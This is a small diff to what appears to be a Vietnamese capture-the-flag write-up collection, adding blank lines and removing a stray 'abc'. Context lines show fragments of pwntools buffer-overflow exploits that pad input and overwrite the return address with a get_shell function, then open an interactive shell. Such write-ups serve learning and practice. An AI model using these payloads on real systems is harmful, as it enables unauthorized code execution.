@@ -299,6 +299,7 @@ payload = b"a" * 56 + p64(exe.sym['get_shell'])
 r.sendlineafter(b"Input: ", payload)
 r.interactive()
 ```
+
 # basic_exploitation_003
 
 ## Source C
@@ -392,6 +393,7 @@ payload += p32(exe.sym['get_shell'] + 1)
 r.send(payload)
 r.interactive()
 ```
+
 # shell_basic
 
 ## Ý tưởng
@@ -651,8 +653,6 @@ r.interactive()
 ```
 
 </details>
-
-abc
 
 ---
 
